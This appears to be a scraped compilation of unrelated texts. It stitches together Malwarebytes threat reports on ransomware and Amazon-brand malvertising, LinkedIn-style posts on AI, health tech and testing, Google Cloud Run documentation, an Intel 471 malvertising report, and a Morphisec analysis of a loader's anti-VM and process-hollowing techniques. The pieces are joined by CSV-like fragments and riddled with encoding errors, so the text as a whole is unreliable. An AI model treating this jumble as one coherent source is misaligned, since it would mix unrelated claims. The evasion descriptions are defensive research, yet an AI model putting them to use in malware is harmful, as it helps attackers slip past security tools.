 This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim did not pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher. Following a three-month lull of activity, Cl0p returned with a vengeance in June and beat out LockBit as the month’s most active ransomware gang. The group's 91 attacks come not long after their extensive GoAnywhere campaign in March, when they hit over 100 organizations using a nasty zero-day. June also witnessed a staggering increase in attacks from relatively new gangs such as Akira (26) and 8Base (41), enough to propel both of them into the top five—a designation usually reserved for more familiar names like ALPHV, who was conspicuously silent in June.  Other big stories in June include a suspected LockBit affiliate arrest, the Royal ransomware gang toying with a new encryptor, and a notable increase in attacks on the Manufacturing sector. Comparing June to the earlier months of the year, we notice several shifts in ransomware activity. There was a massive decrease in the activity from Royal, for example, which normally dominates the monthly rankings—often cracking into the top five—with an average of roughly 30 attacks a month in that period. But last month, they posted just two victims.  While a sudden dip in attacks isn't too unusual for top ransomware gangs, it's worth mentioning that in last month’s review we speculated that Royal might be going through a rebrand. That's because a new ransomware called BlackSuit had appeared which shared 98 percent of its code with the infamous Royal ransomware. Considering that both Royal and BlackSuit were active last month, however, a rebrand probably isn’t happening any time soon. Instead, it’s likely that Royal is simply testing a new encryptor—especially considering that BlackSuit was used in just two attacks last month—and that this lull can be explained as more or less of a research period for them. Other interesting anomalies in June include 47 attacks on the Manufacturing industry (which usually averages around 20 attacks a month) and notable increases in attacks on Switzerland (14) and Brazil (13), both of which are normally attacked only two or three times a month. Part of this can be explained by the fact that 8BASE disproportionately attacked Brazil with 11 attacks last month, while PLAY focused on Switzerland (5). Known ransomware attacks by country, June 2023  Cl0p's precipitous rise to the top of the charts this month, on the other hand, can be explained by their exploitation of a zero-day in MOVEit Transfer, a widely used file transfer software. The vulnerability, which could allow attackers to gain escalated privileges and unauthorized access to an environment, was first disclosed on May 31st in a security bulletin released by Progress. But while it was clear earlier on that attackers were actively exploiting CVE-2023-34362, it was only a few days later that it became clear that Cl0p was behind the attacks. A Cl0p representative confirmed that they had been testing the vulnerability since July 2021 and that they had decided to deploy it over the Memorial Day weekend. What’s more, two other vulnerabilities in MOVEit were found while new victims were still coming forward. In terms of the fallout, it’s tough to overstate the havoc Cl0p was able to wreck thanks to the zero-day. The MOVEit data breaches had widespread impacts, affecting everything from the Oregon DMV and Louisiana OMV (Office of Motor Vehicles)—including the leak of nearly 10 million drivers' licenses—to the University of Rochester and multiple corporations. PBI Research Services also reported a data breach that exposed information for 4.75 million people. The government even offered a reward of up to $10 million for information on Cl0p after several federal agencies in the US fell victim to the gang. LockBit reportedly squeezed about $91 million out of US organizations with around 1,700 attacks since 2020, according to a June report by CISA. As confirmed by our own research data, CISA also found LockBit took the top spot as the biggest global ransomware threat in 2022. As for who was hit the hardest, around 16 percent of ransomware incidents affecting State, Local, Tribal, and Tribunal (SLTT) governments were from LockBit, says the MS-ISAC. In other news, a suspected LockBit affiliate named Ruslan Magomedovich Astamirov, a 20-year-old from the Chechen Republic, was arrested in Arizona last month. The US Justice Department thinks he's been deploying LockBit ransomware on victim networks both in the States and overseas, with the investigation having run from August 2020 through March 2023. Astamirov is now facing charges of wire fraud and of intentionally damaging protected computers, plus he's accused of making ransom demands through deploying ransomware. The arrest makes him the third LockBit affiliate charged in the US since November. NoEscape is a new ransomware which been doing the rounds in underground forums since May 2023. Developed in-house using C++, the NoEscape ransomware uses a hybrid approach to encryption, combining ChaCha20 and RSA encryption algorithms for file encryption and key protection. Last month, NoEscape posted 7 victims on their leak site.   DarkRace is a new ransomware group first discovered by researcher S!Ri. Darkrace specifically targets Windows operating systems and has several similarities to LockBit. The gang attacked 10 victims last month, the majority of them being from the Information and Communications Technology (ICT) sectors. Geographically, most victims are located in Europe, specifically Italy.  Rhysida, a new ransomware gang claiming to be a ""cybersecurity team,"" has been in operation since May 17, 2023, making headlines for their high-profile attack against the Chilean Army.  The gang published a whopping eighteen victims on their leak site in June, making it one of the most prolific newcomers in our month reviews to-date.

                                                        by JÃ©rÃ´me Segura
 Web search is about to embark on a new journey thanks to artificial intelligence technology that online giants such as Microsoft and Google are experimenting with. Yet, there is a problem when it comes to malicious ads displayed by search engines that AI likely won't be able to fix. In recent months, numerous incidents have shown that malvertising is on the rise again and affecting the user experience and trust in their favorite search engine. Indeed, Search Engine Results Pages (SERPs) include paid Google ads that in some cases lead to scams or malware. One particularly devious kind of malvertising is brand impersonation where criminals are buying ads and going as far as displaying the official brand's website within the ad snippet. We previously reported several incidents to Google and it appeared that those ads using official URLs were no longer getting through. However, just recently we noticed a surge in new campaigns again. It only takes a few seconds between a search and a click on a result, and most of the time that click happens to be on whatever shows up first. This is why advertisers are buying ads on search engines, not only to drive traffic towards their brands but also to outpace potential competitors. Unfortunately, not all advertisers have good intentions and the worst of them will exploit anything they can to put out ads that are malicious. For about a week we decided to pull some examples and focused on Amazon-related searches since it is a popular search term (although other popular brands are affected as well). The ads we found were not only claiming to be Amazon's official website, they also displayed the amazon.com URL in the ad. Figure 1a: Malicious advert Figure 1b: Related network traffic Figure 2a: Malicious advert Figure 2b: Related network traffic Figure 3a: Malicious advert Figure 3b: Related network traffic Figure 4a: Malicious ad Figure 4b: Related network traffic Figure 5a: Malicious ad Figure 5b: Related network traffic Below is an animation showing what happens when a victim clicks on one of those ads: Figure 6: Malicious advert leads to phishing page While most of the brand impersonations we have seen recently are pushing tech support scams, this is not the only threat facing consumers. For example, we saw an ad that pretended to be Amazon's login page but instead redirects users to a phishing site, first stealing their password before collecting their credit card number.  Figure 7: A malicious ad leading to a phishing site Part of the problem here is that advertisers can be legitimate affiliates and associated with the Amazon brand. Here's an example of a seller that is advertising on Google and has their own page as an affiliate on Amazon: Figure 8: An advertiser leveraging the Amazon brand correctly  The problem comes when an advertiser that displays a brand's official URL within the ad snippet (i.e. https://www.amazon.com) is allowed to submit an ad URL that has nothing to do with that brand. We have seen many examples that include URL shorteners, cloaking services or domains freshly registered for the sole purpose of malicious activity.  Figure 9: Incidents related to Amazon searches tracked in malvertising spreadsheet The screenshot above is part of a document we have shared with Google where we and other researchers track new malvertising campaigns ranging from scams to malware distribution. Threat actors often rely on traffic filtering services to push malicious content exclusively to intended victims. Practically all the malicious ads we showed earlier used a kind of traffic distribution and filtering system. This market is a bit of a gray area with some companies advertising as anti-bot or anti-fraud providers while others are shamelessly advertising in places frequented by online criminals. The goal is to not only game Google's and other ad networks but also to ensure that only qualified traffic is allowed to come through. With most malvertising from click ads, the practice comes down to something called cloaking. With cloaking, there are two types of URLs used: the legitimate URL (or decoy) and the money URL (the malicious one). In the picture below we see such parameters as well as the threat actor’s money page which contains folders for Amazon (amz) and YouTube - another keyword abused by malvertisers - (ytb) malvertising campaigns:  Figure 10: Cloaking parameters showing the money page In this specific case we discovered a number of domains registered by the scammer, serving more or less the same purpose. One important thing to remember is that these domains are not immediately seen by Google. For example, the traffic filtering service will detect if a click is from a real user or a machine. It can then decide to forward the bogus click to Amazon's website and therefore maintain its cover.  Figure 11: Infrastructure used to redirect Google ads to tech support scams For real traffic, these domains will act as intermediary to the payload pages which tend to be highly disposable and ever changing. There is a simple reason in that these are clearly malicious and will get reported and taken down. However, it is rare for the malvertising infrastructure to actually be disrupted because it is further upstream and rarely documented properly. This allows threat actors to continue with their malicious ad campaigns and simply swap payload pages. We asked Google's AI chatbot Bard if it could fix the malvertising problem that seems to be plaguing its search engine. At first Bard said it was not able to solve this issue:  Figure 12: Bard answering a query about malvertising However, on a second attempt Bard claimed it could after all help to fix the malvertising problem:  Figure 13: Bard answering the same question in a different way Regardless, malvertising is a complex issue and given the billions of daily ad impressions, it's easy for someone nefarious to abuse any given platform. But we don't need AI to identify certain elements that allow threat actors to impersonate brands. Also, while educating users about malvertising is important, we can't blame them for clicking on paid ads that are supposedly verified as trusted. Needless to say that these incidents will encourage users to install ad blockers at the chagrin of publishers whose revenues are heavily dependent on advertising. In the end, it comes down to the user experience and ensuring that it comes first, before anything else. We then asked for some tips to protect against malvertising. We couldn't help but notice that Bard suggested using an ad blocker, although a small disclaimer at the bottom clearly states that Bard may display information that does not represent Google's views. Indeed, the ad industry accounts for almost 80% of Google’s revenues.  Figure 14: Bard offers some tips on how to protect from malvertising Malvertising has been a problem for many years and it's unlikely to change any time soon. It's important for users to be aware that criminals can buy ads and successfully bypass security mechanisms all the while impersonating well-known brands. If you decide to type the URL in the address bar instead, remember to be careful not to make a typo. This is another area that is highly targeted by typosquatters and can also involve malvertising redirects. All of the ads mentioned in this blog post have been reported to Google. We would like to thank the people working in the ad unit for their continued support. Redirects: Cloaking domains: Tech support scam domains: Malwarebytes Browser Guard provides additional protection to standard ad-blocking features by covering a larger area of the attack chain all the way to domains controlled by attackers. Thanks to its built-in heuristic engine it can also proactively block never-before-seen malicious websites. We always recommend using a layered approach to security and for malvertising you will need web protection combined with anti-malware protection.

             A malicious ad for PuTTY, the popular SSH client used by many Windows system administrators. The download is a 108 MB digitally signed MSI installer that contains scripts associated with the BatLoader malware family.

#malvertising #PuTTY #BatLoader Sr. Director of Threat Intelligence at Malwarebytes A simple change could prevent the most common malvertising incidents via software downloads. Digital Security Threat Analyst at Internews The irony is that that URL doesn't necessarily looks more credible than https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html ... . just my 2 cents,

google ads is good, but somehow someone exploit the ads, since your google dork search is putty, with tracking cookie technology and algorithm,, google shows you result with google ads that relate to your search behaviour.

same behaviour is when we go surf online store say example we searh for t-shirt,, after that we login our socmed and most of the ads by the socmed platform came out in the feeds promoting t-shirt.

can you try to clear cache, cookie, ipconfig flush dns, and reset your ISP router to get new dynamic IP, and initially re do the putty search again and confirm the result ?  

 Entrepreneur, Teacher, Content Creator, Cybersecurity Evangelist Thank you firstly for putting this up as a post and highlighting it. Threat actors have been widely abusing google Ads to host malicious websites and run campaigns not only limited to software downloads but for services like - Job Scam, Work from home opportunities etc. 

The easy way for users to detect the above given scenario for a disguised software would be checking the tools hashes and uploading it on Virustotal to validate if the website or tool is genuine. 

And as a responsibility to mark such ads and flag them to Google. CTO at Canis Automotive Labs Ltd. Guess what the top hit is for âMicrosoft Authenticatorâ in the Apple app store?

             APPLE AI [Machine Learning]

Apple does not talk about their AI...

""Apple execs instead use the phrase ""machine learning,"" which is more popular with academics and practitioners. Apple execs also prefer to talk about what software does for the user, such as organizing their photos, improving their typing, or filling out fields in a PDF, as opposed to the technology that makes all that possible.""

KEY POINTS

âªï¸The most powerful technology companies simply cannot stop talking about artificial intelligence, and in particular, the ""generative AI"" flavor that can create human-like text, images, and code.

âªï¸Apple barely talks about artificial intelligence, and you shouldn't expect to hear much about it during the company's earnings next week.

âªï¸Apple's AI works in the background. And the company doesn't yell about it the way some of the other companies do because it doesn't need to.

                Digital Health Transformation | HealthTech Advisor | Clinical Innovator | Emerging Health Technologies
             Growing life expectancy poses important societal challenges, placing an increasing burden on ever more strained health systems. Digital technologies offer tremendous potential for shifting from traditional medical routines to #remotemedicine and transforming our ability to manage health and independence in #agingpopulations. 

Digital #healthtechnology is spreading rapidly, with the aging population becoming a major target group for this technology. The unique capabilities of #wearable sensors coupled with #telehealth platforms are leading a paradigm shift in #geriatrichealthcare. In the future, older adults will be able to rely on a fully #integrated and connected #smarthome with home #monitoringsystem network, combining a variety of body-worn #sensingdevices and electronic surveillance devices within a wireless communication network and a cloud analytics platform. The resulting system will continuously monitor the health, activities, and #wellbeing of the residents and be interfaced with #bigdata processing and alert systems to inform caregivers #remotely about abnormal changes. Such #remotemonitoring will be tailored to meet the specific health needs of residents, for example, based on the level of frailty and the presence of chronic conditions.  

New #healthtechnologies are rapidly changing how older adults #access care and interact with the healthcare system, but their inappropriate use could have negative consequences on physical and mental health. Therefore, providing proper training to the user and the caregiver is important. Furthermore, the cost of #digitalcare, particularly in mid- and low-income countries, needs to be considered to ensure its #accessibility and #affordability. Digital devices need to be included in #healthinsurance systems with the help of governments and regulators to make them widely available to the public, and improving #integration and performance of devices will require lowering the cost of #research and production. Achieving these goals requires partnering with #healthcareproviders, offering more #educational assistance for older adults, and continuous engagement with policymakers. 

The new wave of innovation and transformation will drive meaningful change only when all segments of the older population can #access, #afford, and are able to use these technologies.

             Netflix is NOT offering $900,000 for an artificial intelligence role to replace writers. 

It has a job posting for a Product Manager - Machine Learning Platform, and it says âThe overall market range for roles in this area of Netflix is typically $300,000 - $900,000.â

Machine learning is already in use at Netflix. You know that algorithm that suggests what you might want to watch next?

So if there was any sense of responsibility in media the headline might read:

Netflix offers Machine Learning Job starting at $300k. 

But that wouldnât be quite as divisive a headline what it? Zero clicks. No controversy. Next.

             Unit Tests vs. Integration Tests 
 
Both are important for ensuring the quality and stability of my code. 
 
But, the balance between the two types of tests will depend on the specific needs of your project. 
 
Unit tests are there to test individual units of code in isolation. 
 
They are fast to run and easy to write. And they are great for verifying that a specific function or method works as expected. 
 
It's essential to have a good suite of unit tests in place to ensure that your code is correct and maintainable. 
 
Integration tests test the interaction between different components. They are slower to run and more tedious to write. They are also essential to ensure that other components work together. 
 
I focus on unit tests first and then add integration tests as needed. 
 
This helps me to identify and fix any issues with my code. 
 
The amount of unit and integration tests depends on the project's complexity and requirements. 
 
Here are a few things to consider when deciding how much to focus on each:

Unit tests may be enough if your code is simple and easy to test. If you have complex interactions between different components, integration tests are valuable. 
 
â¢ ð§ð¶ðºð² ð°ð¼ð»ððð¿ð®ð¶ð»ðð: 
 
Unit tests are faster to run and easier to write. If you are under tight deadlines, you may want to focus on unit tests over integration tests. 
 
â¢ ððºð½ð¼ð¿ðð®ð»ð°ð² ð¼ð³ ððµð² ð°ð¼ð±ð²: 
 
Some parts of the code are more critical to the functioning of your application. So they need more thorough testing. It's worth writing more integration tests to ensure everything works as expected. 
 
Remember that both tests are helpful, and you must find the right balance for your needs.

Malwarebytes Threat Intelligence - June 2023 1,https://cloud.google.com/run/docs/overview/what-is-cloud-run,"Cloud Run is a managed compute platform that lets you run containers directly on top of Google's scalable infrastructure. You can deploy code written in any programming language on Cloud Run if you can build a container image from it. In fact, building container images is optional. If you're using Go, Node.js, Python, Java, .NET Core, or Ruby, you can use the source-based deployment option that builds the container for you, using the best practices for the language you're using. Google has built Cloud Run to work well together with other services on Google Cloud, so you can build full-featured applications. In short, Cloud Run allows developers to spend their time writing their code, and very little time operating, configuring, and scaling their Cloud Run service. You don't have to create a cluster or manage infrastructure in order to be productive with Cloud Run. On Cloud Run, your code can either run continuously as a service or as a job. Both services and jobs run in the same environment and can use the same integrations with other services on Google Cloud.  A Cloud Run service provides you with the infrastructure required to run a reliable HTTPS endpoint. Your responsibility is to make sure your code listens on a TCP port and handles HTTP requests. Standard service features include: You can front a Cloud Run service with a Content Delivery Network (CDN) to serve cacheable assets from an edge location closer to clients. Both Firebase Hosting and Cloud CDN provide this capability. Cloud Run adds and removes instances automatically to handle all incoming requests. If there are no incoming requests to your service, even the last remaining instance will be removed. This behavior is commonly referred to as scale to zero. If there are no active instances, a new instance is created on-demand as soon as a request comes in. This negatively impacts the response time for these first requests, depending on how fast your container becomes ready to handle requests. To make sure your service doesn't scale scale to zero instances, you can configure Cloud Run to keep a minimum amount of instances active. Scale to zero is attractive for economic reasons since you're charged for the CPU and memory allocated to an instance with a granularity of 100ms. If you don't configure minimum instances, you're not charged if your service is not used. There are two pricing models you can enable: There is a generous free-tier. Refer to pricing for more information, and refer to CPU allocation to learn how to enable request-based or instance-based pricing for your service. Instances on Cloud Run are disposable. Every container has an in-memory, writable filesystem overlay, which is not persisted if the container shuts down. Cloud Run decides independently when to stop sending requests to an instance and shut it down, for example when scaling in. To receive a warning when Cloud Run is about to shut down an instance, your application can trap the SIGTERM signal. This enables your code to flush local buffers and persist local data to an external data store. To persist files permanently, you can integrate with Cloud Storage or mount a network filesystem (NFS). Cloud Run services are great for code that handles requests or events. Example use cases include: If your code performs work and then stops (a script is a good example), you can use a Cloud Run job to run your code. You can execute a job from the command line using the gcloud CLI, schedule a recurring job, or run it as part of a workflow. A job can start one instance to run your code — that's a common way to run a script or a tool. However, you can also start many identical, independent instances in parallel, that is, an array job. Array jobs are a faster way to process jobs that can be split into multiple independent tasks, as shown here:  For example, if you are reading 1,000 images from Cloud Storage to resize and crop them, processing them consecutively will be slower than processing them all at the same time with many instances. Cloud Run jobs are well-suited to run code that performs work (a job) and quits when the work is done. Here are a few examples: Cloud Run integrates with the broader ecosystem of Google Cloud, which enables you to build full-featured applications. Essential integrations include: Refer to Connecting to Google Cloud services for a list of all Google Cloud services that work well with Cloud Run. In order for your service or job to be deployable to Cloud Run, you must package it in a container image. In case you're not familiar with containers, here's a short conceptual introduction.  A container image is a package with everything your service needs to run. That includes build artifacts, assets, system packages, and (optionally) a runtime. This makes a containerized application inherently portable â it runs anywhere a container can run. Examples of build artifacts include compiled binaries or script files, and examples of runtimes are the Node.js JavaScript runtime, or a Java virtual machine (JVM). Advanced practitioners value the fact that Cloud Run does not impose extra burdens on running their code: you can run any binary on Cloud Run.
For users, including experts, who are looking for more convenience, or want to delegate containerizing their application to Google, Cloud Run integrates with the open source Google Cloud Buildpacks to offer a source-based deployment.

Malwarebytes Threat Intelligence - May 2023 1,https://intel471.com/blog/malvertising-surges-to-distribute-malware,"
The year of 2022 presented both new and evolving trends.
 ""A major factor that distinguishes Intel 471 from competitors is its emphasis on specific target profiles... No other product was found to offer this valuable capability."" 
There were signs of change in 2022 for ransomware. We explore what defenders may see this year.
 ""More sources, a better understanding of the threat landscape, and better professionals working undercover in the darkest corners of the cybercrime world."" Many intrusions and compromises start with the infection of an endpoint with malicious software (malware). Malware distribution is often centered around tricking someone into opening an executable file that purports to be benign, such as a common software utility, but is actually malicious. One of the most common methods for distributing malware is through spam, but there are other ways. One long-used technique to land malware on systems saw a resurgence in December 2022. âMalvertisingâ is a portmanteau of malware and advertising. It involves buying search engine advertisements and placing links in those ads that lead to malicious sites. The technique has been used by threat actors nearly as long as search-related, pay-per-click (PPC) ads have been around, but the recent surge was intense and unexpected. Here, Intel 471 explores how malvertising works, some defenses to employ against it and examples of how it was recently leveraged to distribute malware. How PPC Works Googleâs PPC Ads platform is the primary medium actors use to distribute malware. Intel 471 analysts walked through the process of setting up a Google Ads campaign. The exercise revealed a great deal about how these actors conduct campaigns and some theories about how they obtain top search results for their advertisements. Googleâs PPC Ads management panel has a fairly intuitive design that allows users to view their advertisement campaign statistics at a glance. Users can view their current advertisements, keywords, recommendations, statistics and total cost for each offer. Users must supply a URL to create an advertisement, display paths for the URL, provide a description with the offer and craft some headlines for the advertisement. The descriptions, headlines and site are factored into the equation that Google uses to calculate the advertisement ranking. Once an advertisement is created, users can set the maximum amount of money to spend on PPC for an ad. Advertisement space is sold using a blind auction mechanism where advertisers can outbid competitors but cannot see what others bid for advertisement space. Googleâs old advertisement ranking algorithm previously considered how much advertisers bid to award advertisement placement rankings, however, the new system calculates a mix of advertisement bid price, description, headline and site checking. Once users create an advertisement and set a bid price, they can begin using the multiple tools available on the Google Ads platform. Device targeting allows advertisers to set how much they want to bid on advertisements that will be shown only on certain types of devices, such as tablets or mobile phones. Customers can use additional targeting available in the âAudienceâ tab of the Google Ads panel. Users can monitor the demographics for people who click on the advertisements, create targeted advertisements or exclude certain demographics and target specific types of people, such as those working in financial services or hospitality. The platform also allows advertisers to target customers based on geolocation in addition to audience tracking, or a variety of factors that include cities, states and postcodes.  BokBot BokBot, also known as IcedID, is a banking trojan that also doubles as a downloader for additional malware. The actors behind the development of BokBot historically had a relationship with the Conti ransomware group and Trickbot, another type of banking malware and botnet used to distribute ransomware. During the past year, initial access brokers (IABs) increasingly used BokBot as gateway malware for attacks in place of the now-defunct BazarLoader or Trickbot families. In December 2022 and January 2023, BokBot operators began experimenting with the Google PPC Ads platform for distribution. The traffic distribution system (TDS) of these BokBot campaigns uses victim and bot filtering on the landing page where the Google Search Ads engine points. This filtering ensures that a connecting client is not coming from a virtual private network (VPN) IP address, makes user agent checks and follows hypertext transfer protocol (HTTP) ""GET"" header criteria. If a connection does not meet the criteria, the user is not redirected to the BokBot malicious landing page and instead stays on the advertisement site, which may or may not be related to the targeted app or brand. This site typically is unrelated to the campaign. Connections that meet the targeted criteria are redirected to the BokBot malicious landing page and will never see the advertisement site. A recent BokBot campaign masqueraded as an advertisement for Docker, an operating system virtualization platform. The malicious advertisements contain typosquatted domains and appear higher than the legitimate offer for Docker. Once the user clicks on the ad link, BokBotâs first typosquatting domain performs some basic bot filtering to determine whether the viewer of the advertisement is a legitimate victim to target and not a researcher. If the check fails based on user agent, user agent client hints or geolocation, the Docker campaign landing page will direct the viewer to a fake tutorial on how to set up and use Docker. BatLoader and EugenLoader/FakeBat Malware loaders, also called âdroppers,â are the initial infections on systems which are then used by threat actors to download other malicious code. BatLoader, identified in February 2022, is a type of loader that leverages Microsoft software installers (.msi) and PowerShell.  Intel 471 recently uncovered that two different threat actors are distributing BatLoader through different command and control (C2) infrastructures. The campaign identified as BatLoader by Mandiant in 2022 involved the execution of .BAT files by the .MSI during install. A second campaign, however, does not involve the execution of .BAT files. Instead, that malware has an inline PowerShell script that is executed in place of the .BAT file. Due to these differences, Intel 471 analysts have decided to rename the second campaign to EugenLoader. It is also known as FakeBat. As public reporting and our own reporting blended EugenLoader and BatLoader, it makes it hard to identify when EugenLoader first popped up. But it was likely running as of November or December 2022. During our investigation into EugenLoader, we found a domain that appeared to be used as the download destination for new campaigns. The root of the domain was mistakenly left open and revealed .MSI files for EugenLoader campaigns. As seen below, the EugenLoader malware had been renamed to impersonate known software such as FileZilla, uTorrent and WinRAR, among others. During distribution campaigns, EugenLoader stands up domains that purport to offer legitimate popular software but instead substitute malware for what is promised.  One of the most consistently active malvertising campaigns for EugenLoader masquerades as WinRAR, which is a popular software utility for compressing and extracting files. While other campaigns seemed to get their advertisement to the top of the search results intermittently, the WinRAR campaign has no such limiters. This enables the actors to trick victims into installing EugenLoader continually. EugenLoader was also distributed via a malvertising campaign that spoofed 7-Zip, which is another popular file archiving software. Using well-crafted Google search advertisements, this campaign is able to place its download links before the official 7-Zip download page as observed in the image below. Analysis Until recently, malvertising was not a preferred initial access vector and seldomly was used compared to traditional vectors such as email spam. However, the operators behind EugenLoader were able to purchase advertisements that consistently appeared in the first search result position on Google. It should be assumed it is a dangerously successful technique that has the potential to challenge malware spam (malspam) as the go-to vector for criminals. There are advantages and disadvantages for malware distributors to place malicious advertisements. First, an advantage: Bad actors capture an audience that is actively seeking out a tool to download. Appearing as the first search result means thereâs a high probability someone may click without closely looking at the domain. The subsequent landing page then looks identical to the legitimate one, and people are likely to download and install the tool.  This has advantages over spam, which may be caught and quarantined by security tools or sent to the spam folder, never meeting the eyes of the potential victim. If it does reach the victim, the attacker must trick the person into taking action, such as opening an invoice, clicking on a link or running an executable. But malvertising catches people who want to download something and run it immediately.  Malvertising doesnât come cheap, however. PPC ads could cost as much as US $2 to US $3 per click. Because bad actors are bidding for ad space, the actions also raise the costs for legitimate advertisers. It is possible malvertisers are paying for the ads with stolen credit card information. How bad actors are paying for the ads would be another research avenue to pursue, which could shed light on groups behind the campaigns. In some cases, the success of campaigns could be gauged. Some of the malicious ads directed victims to sites hosted on Bitbucket, which may show the number of downloads. One campaign showed upward of 3,000 downloads. At US $2 a click, those who placed the campaign may have paid as much as US $6,000, which shows the attackers have financial means. Other types of malware seen in the campaigns included information stealers such as RedLine. The malware often thwarted VirusTotal submission. The file sizes were up to 700 MB, which is very large compared to the typical size of a dropper or loader. VirusTotal has a file size limit of 32 MB (files up to 200 MB may be submitted), which meant that malicious files distributed by the campaigns werenât necessarily turning up later for analysis. The malvertising surge, which mostly affected Google, appeared to peak in mid-January 2023 and has fallen since. The security community has been in touch with Google regarding its findings. Several researchers contributed to a spreadsheet that tracked malvertising campaigns and the brands that were impersonated. Between Jan. 19, 2023, and Feb. 22, 2023, the spreadsheet contained examples of 584 malvertising campaigns. Also, researchers created tools such as this one by Randy McEoin that can perform searches for malvertising and this one by Michael McDonnell that also takes screenshots of the campaigns. Hopefully, awareness has increased and defenses have been raised to minimize future malvertising campaigns. Defensive recommendations Intel 471 recommends customers consider deploying advertisement-blocking browser extensions such as the âAdBlock,â âAdblock Plusâ or âuBlock Originâ supported browser extensions. These mitigate the appearance of Google PPC Ads traffic and prevent users from being duped into attempting to install malware masquerading as a legitimate application. Additional recommendations are to monitor for unauthorized MSIs and the installation and running of unsigned executables.

Malwarebytes Threat Intelligence - May 2023 2,https://blog.morphisec.com/in2al5d-p3in4er,"Cybersecurity News, Threat Research, and more from the Team Spearheading the Evolution of Endpoint Security The Aurora stealer is a notorious Golang-based information stealer that's been gaining popularity from the end of 2022 through the first quarter of 2023. The Morphisec Threat Labs team has been tracing its activities using our prevention telemetry along with dark-web activities.   In this blog post however, we arenât going to cover Aurora, but a sometimes overlooked, extremely critical component of the attack delivery chain. The component that makes Auroraâs delivery stealthy and dangerous is a highly evasive loader we named âin2al5d p3in4er.â   The in2al5d p3in4er loader is compiled with Embarcadero RAD Studio and targets endpoint workstations using advanced anti-VM (virtual machine) technique we describe in detail in this post.   We also cover new techniques with significant negative outcomes that represent a concerning change in the landscape, especially in the new era of ChatGPT.  Threat actors always find innovative ways to spread malware and access sensitive information. One growing trend is using YouTube as a malware distribution channel. Hackers take over popular YouTube accounts and post videos with links to malicious websites or downloads. To increase video visibility, they use search engine optimization (SEO) tags to make a video rank higher in search results.   Stealing YouTube accounts is a lucrative business for cybercriminals. Many underground forums and marketplaces offer these services for a fee. The threat actor in this post appears to be using this method as a service, including the websites the videos redirect to.  Compromised YouTube channel The service uses artificial intelligence (AI) to generate videos. This streamlines the process of creating convincing budget backed content. And it allows threat actors to automate diverse lure creation, such as fake software that tricks users into clicking on links.  Example video with download instructions  The above video redirects to different websites that look legitimate.  Fake websites redirected by the YouTube video  The service the threat actors are using enables the creation of decoy websites that look identical to the original websites. These fake websites use similar URLs, logos, and branding to convincingly appear legitimate. Once a user visits one of these sites, theyâre enticed to download an application containing malware or lured to enter sensitive/personal information into the decoy generated website. These websites use geographical targeting to deliver content based on the visitorâs geo-location. The website below is a clone of jobseeker.com  Decoy website for jobseeker.com  This loader uses a surprisingly simple yet highly effective evasion technique. It leverages the usage of CreateDXGIFactory function of dxgi.dll library to query the vendor ID of the graphics card installed on a system. The ID is then compared against a whitelist of vendor IDs; specifically, the 0x10de (NVIDIA), 0x1002 (AMD), and 0x8086 (Intel) graphics cards. If the vendor ID doesnât match the whitelisted values, the loader makes it appear as a benign application by terminating itself.  The anti-VM function checks the graphics vendor ID  After checking the vendor IDs, the loader decrypts the final payload in separate chunks and injects it into `sihost.exe` using a process hollowing technique.   Payload decryption routine  Some samples of the loader do not use the process hollowing technique. Instead, they allocate memory to write the decrypted payload into the allocated memory, and then make a call to the payload entry point (EP).   Payload injection  During the injection process, all loader samples resolve the necessary Win APIs dynamically and decrypt these names using a XOR key: ""in2al5d p3in4er"" (invalid printer), as illustrated in the figure below.   String decryption routine using the ""invalid printer"" key  Another element helping the low detection rate on VirusTotal is the threat actor using Embarcadero RAD Studio to generate executables. Embarcadero RAD Studio is an integrated development environment (IDE) for building software applications that runs on various platforms and operating systems.   Examining samples from our investigation, we found the threat actor is compiling executables using several options from the Embarcadero IDE. Those with the lowest detection rate on VirusTotal are compiled using âBCC64.exeâ, a new Clang based C++ compiler from Embarcadero. This compiler is based on a different code base than a âStandard Libraryâ (Dinkumware) or âRuntime Libraryâ (compiler-rt) and generates optimized code which changes the entry point and execution flow. This breaks security vendorsâ indicators, such as signatures composed from âmalicious/suspicious code block.â  A zero detection rate on VirusTotal  The loader is particularly successful in evading sandboxes and virtual machines. As seen in the image below, the loader has evaded execution by multiple sandboxes. This is a testament to the effectiveness of the loader's simplicity, which leverages a specific aspect of system configuration to achieve exceptional stealth.  Example of sandboxes that fail to execute   Note: A similar technique for evading virtual machines was covered in 2016. It checked the graphicsâ card vendor ID using the DXGI.dll. Although the anti-VM techniques observed in the wild are generally based on blacklisting, this approach uses an inverse check which only searches for graphic cards the target victim should own. This helps to evade sandbox analysis that searches for blacklists of graphic cards.  Malware loaders like in2al5d p3in4er are essentially basic delivery. They establish a foothold between an attacker and their compromised target and are typically the first stage of an attack.   The attackers behind in2al5d p3in4er are combining it with widely accessible social engineering tools for a high impact campaign that takes over popular YouTube accounts and directs viewers to convincing looking fake websites. Theyâre then enticed to download malware from a fake website.  One of the first steps to avoid compromise by in2al5d p3in4er is training organization employees how to detect social engineering campaigns: ensuring URLs are legitimate, and not downloading cracked versions of software.  But as the detection ratio of zero on VirusTotal makes clear, reactive, detection-based cybersecurity technologies like those used in NGAV, EPP, and EDR/XDR are barely capable of detecting and stopping in2al5d p3in4er. Stopping this loader requires different technology.   Morphisecâs Automated Moving Target Defense (AMTD) technology takes a fundamentally different approach to cybersecurity that isnât detection-based. Instead of waiting for malware to breach a system before detecting it, Morphisec proactively secures runtime memory to prevent any unauthorized codeâlike in2al5d p3in4erâfrom executing, regardless of whether a recognizable signature or behavior pattern exists for it.

                                                        by JÃ©rÃ´me Segura
